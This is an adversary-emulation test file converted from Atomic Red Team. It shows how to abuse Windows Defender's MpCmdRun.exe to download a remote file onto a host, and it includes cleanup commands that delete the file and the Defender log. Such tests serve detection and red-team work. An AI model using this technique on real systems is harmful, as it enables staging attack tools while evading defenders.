# Converted from Atomic Red Team - Ingress Tool Transfer
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1105
# Original auto_generated_guid: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc

---
api_version: 2.0
uuid: c67e0c41-fcc7-4044-a419-e74fb56074c6
name: Download a File with Windows Defender MpCmdRun.exe
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).
  The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
  By default, the test downloads the Atomic Red Team license file to the temp directory.

  More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/

mitre:
  tactics:
    - "TA0011 Command and Control"
  techniques:
    - "T1105 Ingress Tool Transfer"

requirements:
  platforms:
    - os: windows

args:
  - name: remote_file
    description: URL of file to download
    type: string
    default: "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt"
  - name: local_file
    description: Location to save downloaded file
    type: path
    default: "C:\\Users\\Public\\malicious.bin"

steps:
  - name: check_mpcmdrun_exists
    executor: cmd.exe
    inline: |
      cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
      MpCmdRun.exe /? >nul 2>&1

  - name: download_file_with_mpcmdrun
    executor: cmd.exe
    inline: |
      cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
      MpCmdRun.exe -DownloadFile -url {{.Args.remote_file}} -path {{.Args.local_file}}
    cleanup:
      executor: cmd.exe
      inline: |
        del {{.Args.local_file}} >nul 2>&1
        del C:\Windows\Temp\MpCmdRun.log >nul 2>&1
